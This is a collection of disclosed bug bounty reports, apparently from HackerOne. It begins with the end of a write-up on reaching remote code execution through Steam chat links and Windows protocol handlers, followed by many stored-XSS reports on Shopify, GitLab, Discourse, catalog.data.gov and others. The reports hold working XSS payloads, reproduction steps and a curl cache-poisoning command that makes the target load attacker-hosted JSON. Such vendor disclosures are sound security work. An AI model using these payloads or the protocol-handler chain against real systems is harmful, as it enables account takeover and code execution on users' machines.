Since the Chat client communicates with a parent window to perform privileged operations like pulling the friends list, I tried doing `window.top.postMessage()` with the `postMessage` commands it used to try to coax the client into doing something bad. It seems like the sandboxed context produced by the OEMBED system prevented access to `window.top`.

At this point, I'd started using the remote console to rapidly test the effects of `steam://` URIs by issuing `open("steam://xxx")`. I didn't find out much more than I had before, but it pushed me to start dissecting the Steam Web Helper Binary a little bit more. I started by running a binary grep in the Steam folder for Steam protocol URIs I knew existed, then I used vim to search for string tables containing these. These led me to a couple of interesting undocumented URIs particular to the Steam Web Helper.

## 3f. Through an Open Window

Two particularly interesting URIs included a Chrome Dev Tools URI I hoped might have some level of privilege and the URI `steam://openexternalforpid` which appeared as `steam://openexternalforpid/%s/%s` in the application binary. The Chrome Dev Tools URI did weird stuff. When I opened it, it opened a single pixel wide black window as many times as I wanted. From the string of `openexternalforpid` it was clear that it required two parameters, but I was at a total loss as to how to work out what they were.

After much guessing myself, I passed the `openexternalforpid` stuff onto my friend [@XMPPWocky](https://twitter.com/XMPPwocky) an extremely capable binary reverse-engineer whom I've found serious Steam bugs with before, but he found it difficult to make much of it with the little time he could spare from saving the world or whatever at Symantec.

I had a thought about the context in which this Javascript was executed. Opening a window is often specially implemented for an embedded browser, and it's pretty frequent that an opened window has different privileges to the opener window. I tried grabbing `open('steam-chrome-dev-tools://something').contentWindow` or whatever the URL was to see if I could grab a privilaged devtools window. With interesting results.

New windows *did* actually have special functions not normally accessible. I could read where the user's cursor was, maximise the window, minimise it and a bunch of other junk none of which brought me closer to remote code execution after hours of testing.

## 3g. Beyond Protocol

In my testing of the `Steam://` protocol I noticed something interesting: whenever I made a typo, Windows would open up a dialog saying, for example that it did not know how to open the file type `sream:` or something. That was interesting to me.

Custom protocols like Steam are implemented by a ton of different pieces of software. They're usually Very Bad, and their security relies on the browser prompting to open this application. Back when everyone used Skype, I had some amusing fun sending people `skype://call` urls which opened calls to the loopback skype number that just echoes what you say.

But like, people don't actually have Skype these days so I was wondering what other custom protocols might be implemented on my system I could leverage. This turned out to be an absolutely *fascinating* rabbit hole into windows internals. I spent hours trawling forums and reference documents describing how to add protocols and what protocols were registered by windows. Turns out, there's quite a few. Windows even has custom protocols for opening maps to places for the user to look at.

Then I went deeper. The custom protocols are actually implemented in the Windows Registry in HKEY_CURRENT_CLASSES or something. It's truly fascinating how telling the structure of this system is. Not only is in this directory every protocol (like, for example, what opens when you open an `http://` link on Windows), but this folder actually contains the file type associations for every filetype in windows, like how Notepad opens if you open a .txt file.

The folders for `http:` protocols and others are sitting right by the folders for `.png`, and they follow the same syntax, describing how arguments get turned into a program invocation. In complete disbelief, I pressed win+R and typed `.txt:hello` ... and it opened Notepad. Custom protocols and filetype associations are *the same thing*.

After that, I scoured the entire class for stuff I might find useful in smarter ways each time. I made a beeline for the .bat filetype which runs arbitrary Windows commands and tried it in Run. It crashed Windows Explorer.

I got smarter and started searching for filetypes that would take the 0th argument and open it with the program, because from reading how protocols opened it was clear that if the 0th argument was called `$0`, protocols like `http://` are essentially `open_webbrowser.exe $0` where `$0` would be the URL.

I came across some truly bizarre sights I wish to share with you aall. There's a `calculator` protocol. I don't know why, but there is. If you wanna be fancy and show popping a calculator, you can literally make a link to `calculator:` like `<a href="calculator:">click me!</a>`, which, when clicked will open the calculator on the victim's computer.

I spent absolutely *hours* trawling this damn database and found a few potentially exploitable protocols. One is `jarfile:`, which executes the jarfile you give it. It's actually the binding for the `.jar` filetype. Another one, `JSEFile:` is a windows xp-era system that let you run an HTML page with VB script like a program. Like prehistoric electron or something.

It... wasn't working. The problem is that `$0` included the full URI. If I make a link to `jarfile:c:/windows/whatever.exe`, the actual invocation is like `c:/Program Files/Java/Java.exe jarfile:c:/windows/whatever.exe`, and well... it tries to find a directory called 'jarfile:c:', which obviously doesn't exist.

I took a break and submitted another ticket, stating that I'd found another interesting method via this means, and I could open any program on their computer, though not with the arguments I might want. I was so sure this was a way to RCE. At the very least I could submit an example that launched `calculator.exe`, which is what all the cool kids do, right?

Almost immediately I had an epiphany. Directory traversal. If it's looking for a directory called 'jarfile:c:' that doesn't exist, we can inject a `../` to say 'go one directory back' and negate the directory that doesn't exist. This was actually a pretty great success. I could send like `jarfile:..\..\..\..\..\..\..\..\Users\Username\Downloads\drive-by-download.jar` and *actually legitimately run* a jar file on the victim's computer. This was simultaneously exciting and disappointing as it meant I couldn't load a jar file remotely. I'd need to get the user to donwload it.

## 3h. openexternalforpid

This whole time, i had the Steam Console open (opened with `steam://console`, I think). I wasn't reading it, but it was printing a lot of useful information, like, in particular what `steam://` invocations it was running. I tabbed onto the console accidentally and by absolute sheer luck, I saw something. When I sent `jarfile: something`, the Steam Web Helper was internally sending `steam://openexternalforpid/10400/jarfile: something`. This is huge.

I immediately switched from all these nonsense custom protocols to invoking `openexternalforpid` with the magic number `10400` and cmd.exe and guess what? Remote. Code. Execution. Job done.

Because this link form isn't a `javascript://` link, it's still honoured by Steam Chat. Either I could send my codepen.io embed *or* I could send my `[link]` tag to get remote code execution :)

# 4. Conclusion
This was fun as all hell and I learned a lot. I always look for bugs where a set of simple mistakes of low severity cascade into one huge bug with critical severity and this is the perfect example of that.

---

### [Bypass Filter and get Stored Xss ](https://hackerone.com/reports/299424)

- **Report ID:** `299424`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @dr_dragon
- **Bounty:** 3000 usd
- **Disclosed:** 2018-12-12T17:50:32.678Z
- **CVE(s):** -

**Vulnerability Information:**

# Description

Shopify allows developers to create a special type of application called a "Sales Channel". Developers are allowed to upload a 16x16 SVG "Navigation Icon" for their app provided the SVG follows the design guidelines which limits the allowed elements and attributes. For some reason when the SVG contains an XML entity this whitelist is no longer enforced allowing the developer to include malicious attributes such as onload. By uploading a malicious SVG a developer can obtain XSS on both partners.shopify.com, as well as any the admin panel of any shop which has authorized the sales channel.

# Proof of Concept

This is relatively easy to reproduce, first create a new application within the Partners dashboard then navigate to "Extensions" -> "Sales channel" to convert the application. After saving those changes a new field within the "App info" section titled "Navigation icon". Upload the following SVG:

```
<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
```

## Impact

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. For more details on the different types of XSS flaws

---

### [Stored XSS in merge request pages](https://hackerone.com/reports/409380)

- **Report ID:** `409380`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @8ayac
- **Bounty:** - usd
- **Disclosed:** 2018-12-03T22:15:49.225Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I found a Stored XSS in merge request pages. 

**Description:**
The exploit is via the parameter `merge_request[source_branch]` of the request to create a New Merge Request.

## Steps To Reproduce:
1. Sign ikn to GitLab.
2. Click the "[+]" icon.
3. Click "New Project".
4. Fill out "Project name" form with "test-project".
5. Check the radio button of "Public".
6. Check the "Initialize repository with a README".
7. Click "Create project" button.
8. Go to "http(s)://{GitLab host}/{user id}/test-project/branches/new".
9. Fill out each form as follows:
  - Branch name: test-branch
  - Create from: master
10. Click "Create branch" button.
11.  Go to "http://{GitLab host}/{user id}/test-project/merge_requests".
12. Click "Create merge request" button.
13. Click "Submit merge request" button.
14. Intercept the request.
15. Change the `merge_request[source_branch]` parameter's value to `<img/src=x onerror=alert(1)>`
16. Send the request.

Result: poc.png

Note: This behavior can be reproduced on all modern browsers.

## Impact

The security impact is the same as any typical Stored XSS.

Thank you.

---

### [Stored XSS on any page in most Uber domains](https://hackerone.com/reports/217739)

- **Report ID:** `217739`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Uber
- **Reporter:** @mdv
- **Bounty:** 6000 usd
- **Disclosed:** 2018-11-20T22:10:13.406Z
- **CVE(s):** -

**Summary (team):**

Due to two IDOR vulnerabilities in Tealium, it was possible to compromise an administrator’s account and inject arbitrary Javascript into `https://tags.tiqcdn.com/utag/uber/*`, which an attacker could leverage for a stored XSS attack on several Uber domains. Additionally, a Tealium user’s password and MFA were resettable by any user, allowing an attacker to take over the account and modify code on their behalf. Although Uber does not own Tealium, we pay our bounties based on impact. Since we had widely implemented this on many different uber.com domains, we awarded a bounty comparable to this bug’s impact. The bug was disclosed to the vendor by @mdv and patched for all Tealium users.

---

### [Web Cache Deception Attack (XSS)](https://hackerone.com/reports/394016)

- **Report ID:** `394016`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Discourse
- **Reporter:** @bobrov
- **Bounty:** 256 usd
- **Disclosed:** 2018-11-18T07:09:41.188Z
- **CVE(s):** -

**Vulnerability Information:**

This XSS does not affect the try.discourse.org, but worked on many other Discourse instances, that i tested. In discussions with the Mozilla team, we came to the conclusion that this is a vulnerability in the Discourse and it needs to be sent through this program.
List of vulnerable hosts:
```
discourse.mozilla.org
forum.learning.mozilla.org
forum.glasswire.com
help.nextcloud.com
meta.discourse.org
```

Description XSS
===
The Web application is vulnerable to XSS through the X-Forwarded-Host header. 

**Vulnerable code**
https://github.com/discourse/discourse/blob/master/app/views/common/_special_font_face.html.erb#L12-L18
```
<% woff2_url = "#{asset_path("fontawesome-webfont.woff2")}?#{font_domain}&v=4.7.0".html_safe %>

<link rel="preload" href="<%=woff2_url%>" as="font" type="font/woff2" crossorigin />
...
    src: url('<%=woff2_url %>') format('woff2'),
```




**HTTP Request**
```http
GET /?xx HTTP/1.1
Host: meta.discourse.org
X-Forwarded-Host: cacheattack'"><script>alert(document.domain)</script>
```

**HTTP Response**
```html
<link rel="preload" 
   href="https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
   <script>alert(document.domain)</script>
   &2&v=4.7.0" as="font" type="font/woff2" crossorigin />
<style>
  @font-face {
    font-family: 'FontAwesome';
    src: url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-2adefcbc041e7d18fcf2d417879dc5a09997aa64d675b7a3c4b6ce33da13f3fe.woff2?https://cacheattack'">
    <script>alert(document.domain)</script>
    &2&v=4.7.0') format('woff2'),
         url('https://d11a6trkgmumsb.cloudfront.net/assets/fontawesome-webfont-ba0c59deb5450f5cb41b3f93609ee2d0d995415877ddfa223e8a8a7533474f07.woff?https://cacheattack&#39;&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;2&v=4.7.0') format('woff');
  }
</style>
```

Web Cache Deception
===
Also, the application caches the HTTP response for 1 minute, so if you send an HTTP request with XSS payload, it will be cached and will be displayed for all requests when the headers match:
Request Start Line, Accept, Accept-Encoding.

**Steps To Reproduce**
For a simpler demonstration, I wrote a script.
The script takes the necessary headers from the request and poisons the cache.
You just need to open the cached page.

1) Open URL
```
https://blackfan.ru/bugbounty/webcachedeception.php?url=https://meta.discourse.org/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```
2) Open the cached URL that the script displays.

3) Result

{F332797}

## Impact

Attacker can collect the popular combinations of Accep + Accept-Encoding and poison the cache of the web pages every minute.
The impact is like a stored XSS on any page.

**Summary (researcher):**

* Web Cache Poisoning
===

---

### [Possibility to inject a malicious JavaScript code in any file on tags.tiqcdn.com results in a stored XSS on any page in most Uber domains](https://hackerone.com/reports/256152)

- **Report ID:** `256152`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Uber
- **Reporter:** @mdv
- **Bounty:** 6000 usd
- **Disclosed:** 2018-11-13T22:54:03.310Z
- **CVE(s):** -

**Summary (team):**

When creating new tags on Tealium, the application did not check that the user creating the tag had authorized as the same account they were creating a tag for. It was possible for an attacker to inject arbitrary content into a web page using the `utag.js` tag. Depending on how the victim implemented these tags, this could potentially allow for text injection, content injection, and HTML injection into the DOM, and even cross-site scripting vulnerabilities. Although Uber does not own Tealium, we pay our bounties based on impact. Since we had widely implemented this on many different uber.com domains, we awarded a bounty in line with this bug’s impact. We also communicated with the Tealium team to patch this vulnerability for all other Tealium users.

---

### [Stored xss](https://hackerone.com/reports/415484)

- **Report ID:** `415484`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @dr_dragon
- **Bounty:** 1000 usd
- **Disclosed:** 2018-11-07T19:09:57.697Z
- **CVE(s):** -

**Vulnerability Information:**

# Description :
WAF cut html tages but when put <!--> before tages we can bypass it :) .

#Step to reproduce :
1-Open your store account
2-Navigate to https://xxx.myshopify.com/admin/settings/general
3-Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
4-Go to https://xxx.myshopify.com/admin/dashboards/live
5-XSS alert message

## Impact

XSS attack

---

### [stored XSS (angular injection) in support.rockstargames.com using zendesk register form via name parameter](https://hackerone.com/reports/354262)

- **Report ID:** `354262`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Rockstar Games
- **Reporter:** @coldd
- **Bounty:** 1000 usd
- **Disclosed:** 2018-11-06T15:37:42.012Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher discovered that registering for our Support site using the Zendesk Registration Form allowed for entering an AngularJS Template Injection payload as the Username. This could have allowed an attacker to perform Stored XSS attacks or similar. We deployed a fix for this issue along with a large site update that also resolved other known vulnerabilities.

---

### [Passive stored XSS at broadcast room](https://hackerone.com/reports/423797)

- **Report ID:** `423797`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Chaturbate
- **Reporter:** @skavans
- **Bounty:** - usd
- **Disclosed:** 2018-11-06T08:11:21.087Z
- **CVE(s):** -

**Summary (team):**

The hacker found that a specially crafted app names could insert a small amount of data into an A tag's href in the "Broadcaster is running these apps: " chat text. Because of the character limit this required multiple successive clicks on different app names, and in the example utilised the room subject. Due to this and that the broadcaster would be required to use specially crafted apps, the scope of attack is limited. We quickly resolved this issue.

**Summary (researcher):**

##Summary##
Hey team,

I have discovered the passive stored XSS at broadcast room page.
The vulnerable component is the running application link at the chat header.

JS function `start_defchat` contains object with many different parameters and the interesting one is `app_info_json`. This parameter contains information about applications running in the following format:
```
APP1_NAME|APP1_DETAILS_LINK,APP2_NAME|APP2_DETAILS_LINK
```
This parameter is used to construct the chat header part containing the information about broadcaster's running applications. Please look at the screenshot below:
{F360611}.
When the parameter is injected into the page source, the `|` symbol is unfiltered so an attacker can craft application with malicious name containing this symbol to forge the app link to the javascript protocol one. So crafting the app with name `something|javascript:alert()`, the following `app_info_json` parameter modification becomes possible:
```
something|javascript:alert()|APP1_DETAILS_LINK,APP2_NAME|APP2_DETAILS_LINK
```
In the case above, the chat header is modified to contain the following DOM element:
```html
<p>You are running these apps: <a href="javascript:alert()" target="_blank">1</a></p>
```

The problem is that the app name length is limited to 32 symbols, that is not enough to craft real world evil XSS-payload. It can be bypassed if the attacker puts the JS-code in some other HTML-element under his control and then just reads and executes it from the evil link. Nevertheless, I could not construct so small payload to even read and execute text of some element. So I have split the payload into two and used two applications to execute it. In this case, the victim should click two links one after another, that decreases the vulnerability risk a little. Though I have add the notification code in my app that writes every 10 seconds that you can earn free tokens if click at both links :)

## Steps To Reproduce:

  1. Change your room title to `alert('XSS by skavans at ' + document.domain)`
  1. Create and run some dummy app/bot with name `1|javascript:b='#roomtitle';0`
  1. Create and run second bot with name `2|javascript:eval($(b).text())`
  1. Start broadcasting and open the room using another account (victim)
  1. Click at link `1`, then at link `2`. The xss will fire after that.

{F360624}

P.S.: The XSS fires at latest Chrome and Safari under Mac OS and does not work at the latest Firefox because of `target="_blank"` link's attribute. The Firefox opens new page after user clicks at such link so it is impossible to click at the second link.

The payload is now injected into the following password-protected room:
https://chaturbate.com/b/h1tester1/ (password is `hackerone`).

## Impact

Get full control under victim's account.

---

### [Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS](https://hackerone.com/reports/303730)

- **Report ID:** `303730`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GSA Bounty
- **Reporter:** @albinowax
- **Bounty:** 750 usd
- **Disclosed:** 2018-11-01T21:16:04.418Z
- **CVE(s):** -

**Vulnerability Information:**

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.

The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 

Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:

1. Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null

2. Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6

3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)

Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"

This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');

To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 

Please let me know if you have any questions.

Cheers,

James & Gareth

## Impact

An attacker can deface most pages on catalog.data.gov.

---

### [Stored XSS on Issue details page](https://hackerone.com/reports/384255)

- **Report ID:** `384255`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @8ayac
- **Bounty:** - usd
- **Disclosed:** 2018-10-30T06:12:08.889Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The detail page of Issue (the page that provides the content of an Issue) is vulnerable to Stored XSS.

**Description:**
The two exploits are via the function of submittin an issue or the function of editing an issue.
This vulnerability is reproduced in `Firefox` and`Chrome`. `IE11` and`Edge` are not. I did not test the reproduction on other browsers.

## Steps To Reproduce:
1. Sign in to GitLab.
2. Click the "[+]" icon.
3. Click "New Project".
4. Fill out "Project name" form with "PoC".
5. Check the check box of "Public".
6. Click "Issues"
7. Click "New issue" button.
8. Fill out the each form as follows:
    * Title: PoC
    * Description: `![xss" onload=alert(1);//](a)`
9. Click "Submit issue".

Furthermore, when editing an already existing issue, you can also reproduce by entering A in the "Description" form and saving it.

## Impact

The security impact is the same as any typical Stored XSS.

Thank you!

**Summary (team):**

The detail page of Issue (the page that provides the content of an Issue) is vulnerable to Stored XSS.

---

### [Stored xss in shop name @ lp.reverb.com](https://hackerone.com/reports/329862)

- **Report ID:** `329862`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Reverb.com
- **Reporter:** @sandeep_hodkasia
- **Bounty:** - usd
- **Disclosed:** 2018-10-01T12:47:19.119Z
- **CVE(s):** -

**Vulnerability Information:**

hello team,

There is a stored xss in lp.reverb.com.
Attacker can inject malicious script into server while adding shop name as `lll"></script><script>alert('xss');</script>`.
Exploit: https://lp.reverb.com/shops/faniyos-boutique/listings

Steps to reproduce:
1. Navogate to https://reverb.com/my/lp_shop/edit
2. Change your lp shop name to this: lll"></script><script>alert('xss')</script>
3. Save the changes.
4. View your lp shop.

Fix:
Sanitise the given input in the backend and encode the special characters.

Thanks,
Sandeep

## Impact

Attack can save malicious script directly into the server. Malicious script can be used to gain users session.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://lp.reverb.com/shops/faniyos-boutique/listings

**Verified**
Yes

---

### [Stored XSS on activity](https://hackerone.com/reports/391390)

- **Report ID:** `391390`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Shopify
- **Reporter:** @shazadsadiq
- **Bounty:** 2000 usd
- **Disclosed:** 2018-08-14T20:29:30.810Z
- **CVE(s):** -

**Vulnerability Information:**

Hi security team members,

#Description
I found a store xss on the activity which allows an attacker to steal admin account cookies.

#Step to reproduce
1-Create store
2- Add a member in a store
3- Member can choose any name 
4- So change the any member name with hunter"><svg/onload=alert(2)>
5- Now on admain account make changes 
6- That will create activity with attacker malicious payload

#POC
Please see the below image
{F329469}
Let me know if more information is needed to my end.
Best Regards,
Shahzad

## Impact

An attacker(staff member) can takeover admin account.

---

### [XSS-уязвимость, связанная с загрузкой файлов](https://hackerone.com/reports/375886)

- **Report ID:** `375886`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** VK.com
- **Reporter:** @dvudvudvu
- **Bounty:** - usd
- **Disclosed:** 2018-08-02T11:17:19.545Z
- **CVE(s):** -

**Summary (team):**

XSS в документах.

---

### [stored xss in scrape-metadata when reading metadata from an html page](https://hackerone.com/reports/369573)

- **Report ID:** `369573`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @johnssimon007
- **Bounty:** - usd
- **Disclosed:** 2018-07-27T11:25:18.117Z
- **CVE(s):** -

**Vulnerability Information:**

Hy

# Module
scrape-metadata
https://www.npmjs.com/package/scrape-metadata

## Module Description
a module used to scrape meta data contents from an article

## Vulnerability Description
It was possible to embed malicious js code in metadata content read by scrape-metadata. When library reads such metadata, there was no sanitization performed. If output from scrape-metadata is rendered directly in HTML code,it can lead to xss/html injection.

## Steps To Reproduce:
create a website, I used a local server available at http://127.0.0.1:8080
Below is html file with js code injected in 'og:title property' and i uploaded the file to my
remote server http://pokegen.in/test.html

<!doctype html>
<html xmlns:og="http://ogp.me/ns#" lang="en">

<head>
    <meta charset="utf8">
    <title>scrap-meta</title>

    <meta property="og:description" content="hackerone">
    <meta property="og:image" content="image">
    <meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
    <meta property="og:type" content="article">
</head>
<body>
</body>
</html>

install scrape-metadata
npm install scrape-metadata

const http=require('http');
const server=http.createServer();
const express=require('express');
const app=express();
const scrape = require('scrape-metadata')
var url = "http://pokegen.in/test.html";
app.get('/scrap', function(req, res) {
scrape(url, (err, meta) => {
    console.log(meta)
      let __html = `
               <div>
                   <p>site title:${JSON.stringify(meta)}</p>
               </div>
           `
           res.send(__html)
  });

});

app.listen(8080)

save this as scrap.js
now run the app,node scrap.js
now goto http://127.0.0.1:8080/scrap on browser.and you will get a javascript prompt

Supporting Material/References:

Configuration I've used to find this vulnerability:
windows 7
node 8.9.3
npm 5.5.1
curl 7.54.0
# Wrap up
 If you have any questions about any details of this finding, please let me know in comment.

Thank you

Regards,
johns simon


- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

This might lead to stealing session cookies from infected website, and much more sophisticated attacks

---

### [Stored XSS in Node-Red](https://hackerone.com/reports/349146)

- **Report ID:** `349146`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Node.js third-party modules
- **Reporter:** @misterch0c
- **Bounty:** - usd
- **Disclosed:** 2018-07-18T09:20:01.788Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report a stored XSS in node-red
It allows to execute javascript in the user's browser

# Module

**module name:** node-red
**version:** v0.18.4
**npm page:** `https://www.npmjs.com/package/node-red`

## Module Description

> A visual tool for wiring the Internet of Things.

## Module Stats

1,758 downloads in the last day
10,601 downloads in the last week
40,000+ downloads in the last month

# Vulnerability
## Steps To Reproduce:

* Install the module

`sudo npm install -g --unsafe-perm node-red`

* Run it
`node-red`
then access it in http://localhost:1880

* Exploit
The same payload can be applied in different locations.
Payload: `<script>alert('xss')</script>`
Places where you can put the payload:
Drag & drop any item from the left menu to the center then put the payload in the `name` field. After clicking "done", the xss is triggered. At this point it's only triggered in your browser.
Click the "deploy" button, now any user that will browse to  http://localhost:1880 will have the javascript executed.
Second one:
Click the "+" button on the top right to create a new "flaw". Put the payload in the name field. Again you need to press "deploy". After that double clicking on the "flaw" will execute the javascript.

## Supporting Material/References:

- Archlinux
- NodeJS 9.4.0
- NPM 5.6.0
- Firefox 57.0.4 & Chromium 64.0.3282.119
- node-red v0.18.4

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

¯\_(ツ)_/¯

## Impact

It allows executing malicious javascript code in the user's browser

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
http://localhost:1880

**Verified**
Yes

---

### [XSS (Persistent) - Selecting role(s) for protected branches](https://hackerone.com/reports/346111)

- **Report ID:** `346111`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** GitLab
- **Reporter:** @phillycheeze
- **Bounty:** - usd
- **Disclosed:** 2018-07-16T17:17:14.335Z
- **CVE(s):** CVE-2018-10379

**Vulnerability Information:**

**Summary:** 
When using the dropdown that selects the groups or users that are allowed to push or merge to a protected branch within a project, it is possible to trigger a XSS with a malicious user name string. 

**Description:**
This vulnerability is similar to the recently announced CVE-2018-10379. The username input string where an attacker is able to inject a payload is in the same location, but the XSS that renders is in a different location. Since the remediation needs to be applied at the presentation layer, this is indeed a separate vulnerability and needs to be fixed separately (although Gitlab could start whitelisting characters allowed in usernames, similar to how Gitlab whitelists characters for Group or Project names).

The steps to reproduce are fairly simple but there are some restrictions:
  *  Only members of a project with Master access are able to become victims of the XSS
  *  Only groups/members with a subscription level of Starter or higher are able to perform the XSS, since this requires the ability to restrict merge/push permissions of a branch to a specific user. This is a premium feature only allowed at Starter or higher. (https://gitlab.com/help/user/project/protected_branches#restricting-push-and-merge-access-to-certain-users-starter)

## Steps To Reproduce:
  1. Set your own username as "<img src=x onerror=alert(document.domain)> foo / bar"
  1. Make yourself have at least Master access to a project
  1. In this project, ensure at least one branch is in the project and that branch is a "Protected Branch"
  1. Under Project Settings -> Repository -> Protected Branches, select the dropdown under the "Ability to Merge" section
  1. Notice that the onerror attribute from the username renders.

## Supporting Material/References:
More information can be provided upon request. 

You'll notice the payload above is the same as the payload used in a test file (inside the ce source code repo) for the CVE I attached. I only found this vulnerability since I was testing the previous CVE on our own internal instance of Gitlab, left my username saved as that malicious string, and later found the alert() dialog popup in another area of the site even after patching to 10.7.2.

## Suggested Remediation
I believe this is the offending Line: https://gitlab.com/gitlab-org/gitlab-ee/blob/master/ee/app/assets/javascripts/projects/settings/access_dropdown.js#L461

^There could also be other XSS vulnerabilities in this JS file. Everywhere else in the app uses the underscore method  `_.escape()`to escape user input, but this file doesn't.

## Impact

The security impact is the same as any typical persistent xss.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://gitlab.com/group/project/settings/repository

**Verified**
Yes

---

### [Stored XSS in "post last edited" option](https://hackerone.com/reports/333507)

- **Report ID:** `333507`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** Discourse
- **Reporter:** @luigigubello
- **Bounty:** 256 usd
- **Disclosed:** 2018-07-09T16:04:37.753Z
- **CVE(s):** -

**Vulnerability Information:**

1. There are two users: **Attacker** and **Victim**.
2. **Attacker** starts a private talk via private message with the **Victim**.
3. **Attacker** send a message to **Victim**, then he edits it or deletes it.
4. **Victim** sees the *yellow pencil*, symbol of the edit.
5. **Victim** clicks on *yellow pencil* to see the edit and the XSS runs.

Other info: the XSS also runs on topic (video PoC #2). You can find my XSS message on this URL:
https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278
It is very dangerous because it can hit many users at the same time.

## Impact

XSS can use to steal cookies, password or to run arbitrary code on victim's browser

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://try.discourse.org/t/recommended-reading-for-community-and-foss-enthusiasts/278

**Verified**
Yes

---

### [Очень жесткая XSS в личных сообщениях m.ok.ru](https://hackerone.com/reports/302253)

- **Report ID:** `302253`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Stored
- **Program:** ok.ru
- **Reporter:** @circuit
- **Bounty:** - usd
- **Disclosed:** 2018-06-30T11:04:05.699Z
- **CVE(s):** -

**Vulnerability Information:**

Приветствую.

Нашел багу в личных сообщениях в мобильной версии
{F251208}

Что нужно, чтоб заюзать:

1. Переходим в группу https://m.ok.ru/group/54904397693159/market
2. Ищем товар единственный на страничке
{F251213}
3. Переходим на него и нажимаем на кнопку "Связаться с продавцом" (https://m.ok.ru/group/54904397693159/market)
{F251215}
4. Видим алерт.
{F251216}


Нет фильтрации служебных символов тут -
<div class="discus_dialogs_topic emphased tx-ellip">"&gt;<img src="x" onerror="alert()"></div>

## Impact

XSS.

---

